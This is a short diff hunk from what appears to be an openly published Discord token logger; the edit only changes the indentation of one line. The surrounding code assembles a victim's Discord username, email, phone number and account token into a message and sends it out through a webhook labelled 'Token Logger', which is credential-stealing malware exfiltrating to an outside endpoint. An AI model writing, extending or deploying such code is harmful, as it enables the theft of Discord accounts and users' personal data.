@@ -191,7 +191,7 @@ def Discord_tokens():
                f"👤 **Username** `{user['username']}#{user['discriminator']}`\n"
                f"📧 **Email** `{user.get('email', 'None')}`\n"
                f"📱 **Phone Number** `{user.get('phone', 'None')}`\n"
-                f"🔑 **Discord Token** `{token}`\n"
+               f"🔑 **Discord Token** `{token}`\n"
                f"🐙 **GitHub:** https://github.com/deadconvicess/Discord-Token-Logger"
                 )
                 send_webhook(info, title=f"Token Logger - deadconvicss", encrypt=False)
